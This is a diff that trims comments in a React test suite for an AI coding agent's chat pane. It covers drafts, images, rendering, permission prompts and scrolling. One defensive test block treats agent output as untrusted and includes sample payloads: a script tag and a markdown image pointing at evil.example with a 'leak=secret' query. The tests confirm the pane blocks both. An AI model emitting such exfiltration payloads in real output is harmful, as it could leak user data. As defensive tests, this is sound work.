@@ -4,9 +4,9 @@ import { render, screen, cleanup, waitFor, fireEvent } from '@testing-library/re
 import type { AcpClientMessage, AcpEvent, AcpToolCall } from '@yaac/shared/acp'
 
 /**
- * jsdom has no ResizeObserver, and the pane makes one to follow the tail when
- * its box shrinks. Drivable rather than inert, so the scroll-follow tests
- * below can play the resize a soft keyboard causes.
+ * jsdom has no ResizeObserver; the pane uses one to follow the tail when it
+ * shrinks. This fake can be fired so the scroll-follow tests can simulate a
+ * soft keyboard opening.
  */
 const paneResized = new Set<() => void>()
 beforeAll(() => {
@@ -22,16 +22,10 @@ beforeAll(() => {
 })
 
 /**
- * What the chat pane keeps across a teardown. A pane going off-screen stays
- * mounted, but one whose workspace stops — or whose tab is closed, or that a
- * reload takes with it — does not, so a draft held in component state would
- * simply vanish. The awkward case is the one where the draft is a message that
- * was already sent but not yet echoed back, which must NOT come back to haunt
- * the box.
- *
- * The ACP socket is mocked at the hook: everything below it is transport,
- * already covered by use-acp-stream.test.tsx, and none of it is what this
- * behavior turns on.
+ * Draft persistence across unmounts (workspace stopped, tab closed, reload).
+ * The tricky case is a draft that was sent but not yet echoed back, which
+ * must not reappear in the box. The ACP hook is mocked; transport is covered
+ * by use-acp-stream.test.tsx.
  */
 
 const stream = {
@@ -110,10 +104,10 @@ describe('WorkspaceChat drafts', () => {
     type('ship it')
     fireEvent.click(screen.getByText('Send'))
     expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: 'ship it' })
-    // Handed to the socket, but not yet confirmed: the text is still there.
+    // Sent but not yet confirmed, so the text stays.
     expect(box().value).toBe('ship it')
 
-    // The echo is what confirms delivery — and what empties the box.
+    // The echo confirms delivery and empties the box.
     stream.events = [user(0, 'ship it')]
     rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
     await waitFor(() => expect(box().value).toBe(''))
@@ -121,8 +115,8 @@ describe('WorkspaceChat drafts', () => {
   })
 
   it('drops a restored draft the conversation shows was delivered', async () => {
-    // Sent, then navigated away before the echo landed: the message did arrive,
-    // so the replayed history — not the pane's memory — has the last word.
+    // Sent, then navigated away before the echo. The message did arrive, so
+    // the replayed history wins over the saved draft.
     useUiStore.getState().setChatDraft('w1', 'acp-1', 'already sent')
     useUiStore.getState().setChatSent('w1', 'acp-1', 'already sent')
     stream.events = [user(0, 'already sent')]
@@ -132,8 +126,8 @@ describe('WorkspaceChat drafts', () => {
   })
 
   it('keeps a restored draft the conversation never received', async () => {
-    // Same shape, but the socket dropped before the prompt got through: the
-    // last thing the agent heard is something else, so the text stays put.
+    // The socket dropped before the prompt got through, so the history ends
+    // with something else and the text stays.
     useUiStore.getState().setChatDraft('w1', 'acp-1', 'never made it')
     useUiStore.getState().setChatSent('w1', 'acp-1', 'never made it')
     stream.events = [user(0, 'an earlier message')]
@@ -142,10 +136,9 @@ describe('WorkspaceChat drafts', () => {
   })
 
   it('keeps typed-but-unsent text that repeats what was already said', async () => {
-    // The trap the `sent` marker exists for: short replies repeat. "ok" was
-    // sent and answered; the user types "ok" again and leaves before sending.
-    // Nothing was in flight, so history saying "the last thing you said was
-    // ok" is not evidence about THIS text.
+    // Why the `sent` marker exists: short replies repeat. "ok" was sent and
+    // answered; the user types "ok" again and leaves before sending. Nothing
+    // was in flight, so the history says nothing about this text.
     useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok')
     stream.events = [user(0, 'ok'), { type: 'agent', seq: 1, content: [{ type: 'text', text: 'done' }] }]
     show()
@@ -153,8 +146,8 @@ describe('WorkspaceChat drafts', () => {
   })
 
   it('keeps an edited draft even when the original send was delivered', async () => {
-    // The message went out and arrived, but the box has been typed into since.
-    // What it holds now is new work, whatever the history says.
+    // The message arrived, but the box has been edited since, so its content
+    // is new work.
     useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok')
     useUiStore.getState().setChatSent('w1', 'acp-1', 'ok')
     useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok, and one more thing')
@@ -164,8 +157,8 @@ describe('WorkspaceChat drafts', () => {
   })
 
   it('keeps a restored draft while the pane is still connecting', async () => {
-    // Nothing to reconcile against until the replay lands — dropping the text
-    // on a hunch would lose it outright.
+    // There is nothing to compare against until the replay lands, so the
+    // text is kept.
     stream.connected = false
     useUiStore.getState().setChatDraft('w1', 'acp-1', 'unsent')
     show()
@@ -174,8 +167,8 @@ describe('WorkspaceChat drafts', () => {
 })
 
 /**
- * Images ride a message inline. jsdom decodes no images, so the bitmap the
- * downscale measures is stood in for: an image this small goes as it is.
+ * Images are sent inline in a message. jsdom decodes no images, so the
+ * downscale's bitmap is faked; an image this small is sent unchanged.
  */
 describe('WorkspaceChat images', () => {
   const PNG = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])
@@ -209,8 +202,8 @@ describe('WorkspaceChat images', () => {
     fireEvent.click(screen.getByText('Send'))
     expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: 'what is this?', images: [image] })
 
-    // The echo carries the image back, now drawn in the conversation, and the
-    // composer lets go of both halves of what it sent.
+    // The echo draws the image in the conversation, and the composer clears
+    // both the text and the image.
     stream.events = [{ type: 'user', seq: 0, content: [{ type: 'text', text: 'what is this?' }, image] }]
     rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
     await waitFor(() => expect(box().value).toBe(''))
@@ -238,10 +231,8 @@ describe('WorkspaceChat images', () => {
 })
 
 /**
- * How the conversation reads. The agent writes markdown whether or not anyone
- * renders it, and its edits arrive as before/after pairs rather than prose —
- * so what is asserted here is that each kind of content is shown as the thing
- * it is, and that the one worth reading (an edit) is open without a click.
+ * How each kind of content renders: agent markdown, user text verbatim, tool
+ * output, file reads as code, and edits as diffs that start expanded.
  */
 describe('WorkspaceChat rendering', () => {
   const agent = (seq: number, text: string): AcpEvent =>
@@ -266,8 +257,7 @@ describe('WorkspaceChat rendering', () => {
   })
 
   it('puts the user on the left, verbatim', () => {
-    // Left like everything else — and literal: a user typing `**not bold**`
-    // meant those asterisks.
+    // Rendered literally: a user typing `**not bold**` meant the asterisks.
     stream.events = [user(0, '**not bold**')]
     const { container } = show()
     expect(screen.getByText('**not bold**')).toBeTruthy()
@@ -315,8 +305,7 @@ describe('WorkspaceChat rendering', () => {
     expect(screen.getByText('two')).toBeTruthy()
     expect(screen.getByText('TWO')).toBeTruthy()
     expect(container.querySelector('.diff-hl')).toBeTruthy()
-    // And the totals are on the row itself, so a collapsed one still says how
-    // big the edit was.
+    // The totals are on the row, so a collapsed edit still shows its size.
     expect(screen.getByText('+1')).toBeTruthy()
     expect(screen.getByText('−1')).toBeTruthy()
   })
@@ -337,8 +326,8 @@ describe('WorkspaceChat rendering', () => {
   })
 
   it('opens an edit that only becomes one on a later update', () => {
-    // A tool call arrives `pending` and empty, and grows its content as it
-    // runs — so "is this an edit?" is not a question the first event answers.
+    // A tool call arrives `pending` and empty and gains content as it runs, so
+    // the first event can't tell whether it is an edit.
     stream.events = [toolCall(0, { toolCallId: 't1', title: 'Edit a.ts', kind: 'edit', status: 'pending' })]
     const { container, rerender } = show()
     expect(container.querySelector('.diff-hl')).toBeNull()
@@ -362,8 +351,8 @@ describe('WorkspaceChat rendering', () => {
     })]
     show()
     expect(screen.queryByText('a.ts')).toBeNull()
-    // Its output is markdown too: the fence the adapter wrapped stdout in is a
-    // code block, not four backticks the user has to read past.
+    // Its output is markdown too: the adapter's fence around stdout renders as
+    // a code block, not visible backticks.
     fireEvent.click(screen.getByText('ls'))
     expect(screen.getByText('a.ts')).toBeTruthy()
     expect(screen.getByText('ls').closest('div')?.textContent).not.toContain('```')
@@ -379,8 +368,8 @@ describe('WorkspaceChat rendering', () => {
     })]
     const { container } = show()
     fireEvent.click(screen.getByText('Read a.ts'))
-    // Source, not prose: the `#` is a line of the file rather than a heading,
-    // and the code is tokenized the way the diff views tokenize it.
+    // Rendered as source: `#` is a line of the file, not a heading, and the
+    // code is tokenized like the diff views.
     expect(container.querySelector('h1')).toBeNull()
     expect(container.querySelector('.diff-hl')?.textContent).toContain('# not a heading')
     expect(container.querySelector('.tok-keyword')?.textContent).toBe('const')
@@ -392,8 +381,8 @@ describe('WorkspaceChat rendering', () => {
       title: 'Read a.ts',
       kind: 'read',
       locations: [{ path: '/workspace/a.ts' }],
-      // What an agent's file reader prints: a numbered gutter, and — for some
-      // adapters — the whole thing inside a fence.
+      // An agent's file reader prints a numbered gutter, and some adapters
+      // wrap the whole thing in a fence.
       content: [{ type: 'text', text: '```\n   7→const x = 1\n   8→\n   9→export {}\n```\n' }],
     })]
     const { container } = show()
@@ -401,7 +390,7 @@ describe('WorkspaceChat rendering', () => {
     const block = container.querySelector('.diff-hl')
     expect(block?.textContent).toContain('const x = 1')
     expect(block?.textContent).toContain('export {}')
-    // The numbers are the gutter, and are no longer in the code.
+    // The numbers move to the gutter, out of the code.
     expect([...container.querySelectorAll('.w-10')].map((e) => e.textContent)).toEqual(['7', '8', '9'])
     expect(block?.textContent).not.toContain('→')
     // Nor are the adapter's backticks part of the file.
@@ -409,9 +398,8 @@ describe('WorkspaceChat rendering', () => {
   })
 
   it('shows a read that named no file as code anyway', () => {
-    // A read's body is a file's text whether or not the adapter said which
-    // file. Without a path there is nothing to color it by — but it is still
-    // the file's own lines, not a document to reinterpret.
+    // A read's body is file text even when the adapter names no file. Without
+    // a path it can't be highlighted, but it is still not markdown.
     stream.events = [toolCall(0, {
       toolCallId: 't1',
       title: 'Read something',
@@ -426,8 +414,8 @@ describe('WorkspaceChat rendering', () => {
 
   it('keeps a markdown file’s own fences', () => {
     // Unwrapping a lone fence assumes the backticks are an adapter's wrapper.
-    // For a `.md` that assumption is wrong often enough to drop: a document
-    // whose body is one code sample would lose characters it really contains.
+    // For a `.md` that is often wrong: a document whose body is one code
+    // sample would lose real characters.
     stream.events = [toolCall(0, {
       toolCallId: 't1',
       title: 'Read notes.md',
@@ -469,14 +457,10 @@ describe('WorkspaceChat rendering', () => {
 })
 
 /**
- * What rendering agent prose as markup must never do.
- *
- * An agent's reply is written by a model that has been reading the repository,
- * so its text is untrusted input that happens to arrive in a friendly shape.
- * Everything below holds today because of a react-markdown default nobody
- * overrode — no `rehype-raw`, no `urlTransform` prop, no image fetching — and
- * a default is exactly the kind of invariant a one-line change removes in
- * silence. These are the assertions that make that change fail out loud.
+ * Agent output is untrusted: the model has been reading the repository. These
+ * safety properties rest on react-markdown defaults (no `rehype-raw`, no
+ * `urlTransform` prop, no image fetching), which a one-line change could
+ * remove silently. These tests make such a change fail.
  */
 describe('WorkspaceChat with hostile agent output', () => {
   const agent = (seq: number, text: string): AcpEvent =>
@@ -500,7 +484,7 @@ describe('WorkspaceChat with hostile agent output', () => {
     expect(container.querySelector('script')).toBeNull()
     expect(container.querySelector('b')).toBeNull()
     expect(container.querySelector('[onclick]')).toBeNull()
-    // Not silently dropped either — it is shown as the text it is.
+    // Not dropped either: it is shown as text.
     expect(container.textContent).toContain('<script>')
   })
 
@@ -513,8 +497,8 @@ describe('WorkspaceChat with hostile agent output', () => {
   })
 
   it('shows a remote image as a link instead of fetching it', () => {
-    // An `<img src>` is a request the browser makes on render, with no click —
-    // which is a way out of the page for anything the URL encodes.
+    // An `<img src>` makes a request on render with no click, which could leak
+    // whatever the URL encodes.
     stream.events = [agent(0, '![a caption](https://evil.example/pixel?leak=secret)\n')]
     const { container } = show()
     expect(container.querySelector('img')).toBeNull()
@@ -523,8 +507,8 @@ describe('WorkspaceChat with hostile agent output', () => {
 
   it('keeps tool output that breaks out of its fence inside the same sandbox', () => {
     // The adapter wraps stdout in a ```console fence, and stdout can contain
-    // triple backticks — so output becomes arbitrary markdown. That is allowed
-    // to look odd; it is not allowed to reach the DOM.
+    // triple backticks, so output can become arbitrary markdown. It may look
+    // odd but must not reach the DOM as markup.
     stream.events = [{
       type: 'tool',
       seq: 0,
@@ -544,10 +528,9 @@ describe('WorkspaceChat with hostile agent output', () => {
 })
 
 /**
- * The pane's half of an enforced permission mode. The agent is blocked until
- * one of these buttons is pressed, so what matters is that the question is
- * answerable, that the answer reaches the socket, and that the card retires on
- * the server's word rather than on the click.
+ * Permission asks. The agent is blocked until a button is pressed, so the
+ * tests check the answer reaches the socket and the card closes only when the
+ * server confirms, not on the click.
  */
 describe('WorkspaceChat permission asks', () => {
   const ask = (seq: number, requestId = '5'): AcpEvent => ({
@@ -578,7 +561,7 @@ describe('WorkspaceChat permission asks', () => {
   it('offers one button per option, over the call being asked about', () => {
     stream.events = [ask(0)]
     show()
-    // The command itself, not a restatement of it: deciding needs the evidence.
+    // Show the actual command so the user can decide.
     expect(screen.getByText('rm -rf build')).toBeTruthy()
     expect(screen.getByRole('button', { name: 'Deny' })).toBeTruthy()
     expect(screen.getByRole('button', { name: 'Allow Once' })).toBeTruthy()
@@ -592,8 +575,8 @@ describe('WorkspaceChat permission asks', () => {
     expect(stream.send).toHaveBeenCalledWith({
       type: 'permission', requestId: '5', optionId: 'allow',
     })
-    // The card stays until the server says so, but its buttons do not invite a
-    // second answer while the first is in flight.
+    // The card stays until the server confirms, but its buttons are disabled
+    // while the answer is in flight.
     expect(screen.getByRole('button', { name: 'Allow Once' })).toHaveProperty('disabled', true)
     expect(screen.getByRole('button', { name: 'Deny' })).toHaveProperty('disabled', true)
   })
@@ -610,7 +593,7 @@ describe('WorkspaceChat permission asks', () => {
     stream.send.mockReturnValue(false)
     show()
     fireEvent.click(screen.getByRole('button', { name: 'Deny' }))
-    // Nothing on the far side heard it, so the question is still open.
+    // The send failed, so the question is still open.
     expect(screen.getByRole('button', { name: 'Deny' })).toHaveProperty('disabled', false)
   })
 
@@ -621,16 +604,14 @@ describe('WorkspaceChat permission asks', () => {
     ]
     show()
     expect(screen.queryByRole('button', { name: 'Allow Once' })).toBeNull()
-    // Named rather than dropped, so a manual-mode transcript reads back as the
-    // decisions that produced it.
+    // The decision is shown, so a manual-mode transcript records it.
     expect(screen.getByText(/Allow Once/)).toBeTruthy()
   })
 
   it('says the agent is waiting on the user rather than working', () => {
-    // A blocked turn is `busy` — its prompt is unanswered — but "working"
-    // under the card asking the user to act is the one place that misreads.
-    // The label's trailing dots are decorative spans, so the text to match on
-    // is the word itself.
+    // A blocked turn is still `busy`, but "working" under a card asking the
+    // user to act would mislead. The label's trailing dots are separate spans,
+    // so match on the word alone.
     stream.events = [ask(0)]
     stream.busy = true
     show()
@@ -647,12 +628,9 @@ describe('WorkspaceChat permission asks', () => {
 })
 
 /**
- * Where the conversation sits when the pane changes size under the reader.
- *
- * On a phone the thing that shrinks it is the soft keyboard, so the gesture
- * that loses the tail is tapping the box to reply — to the message that just
- * scrolled out of sight. The rule is the same one the streaming follow uses:
- * only a reader already at the tail is carried down with it.
+ * Scroll position when the pane resizes. On a phone the soft keyboard shrinks
+ * it when the user taps to reply. As with streaming, only a reader already at
+ * the tail is kept at the tail.
  */
 describe('WorkspaceChat scroll follow', () => {
   beforeEach(() => {
@@ -668,8 +646,8 @@ describe('WorkspaceChat scroll follow', () => {
     paneResized.clear()
   })
 
-  /** jsdom lays nothing out, so the scroller's metrics are installed by hand.
-   *  `scrollTop` records what the pane writes, which is the assertion. */
+  /** jsdom does no layout, so the scroller's metrics are set by hand. The
+   *  returned function reads the `scrollTop` the pane wrote. */
   function scroller(container: HTMLElement, clientHeight: number, scrollTop: number): () => number {
     const el = container.querySelector('.overflow-y-auto') as HTMLElement
     let top = scrollTop
@@ -685,8 +663,8 @@ describe('WorkspaceChat scroll follow', () => {
 
   it('follows the tail when the pane shrinks under a reader who was at it', () => {
     const { container } = show()
-    // The keyboard is up: 400px of pane became 200, and the bottom of the
-    // conversation is now below the fold.
+    // The keyboard shrank the pane from 400px to 200px, pushing the bottom of
+    // the conversation out of view.
     const top = scroller(container, 200, 600)
     for (const fire of paneResized) fire()
     expect(top()).toBe(1000)
@@ -696,8 +674,8 @@ describe('WorkspaceChat scroll follow', () => {
     const { container } = show()
     const list = container.querySelector('.overflow-y-auto') as HTMLElement
     const top = scroller(container, 200, 0)
-    // They went back to read an earlier tool call; the keyboard must not yank
-    // them to the bottom any more than a streaming reply may.
+    // The reader scrolled up to an earlier tool call; the keyboard must not
+    // jump them to the bottom.
     fireEvent.scroll(list)
     for (const fire of paneResized) fire()
     expect(top()).toBe(0)
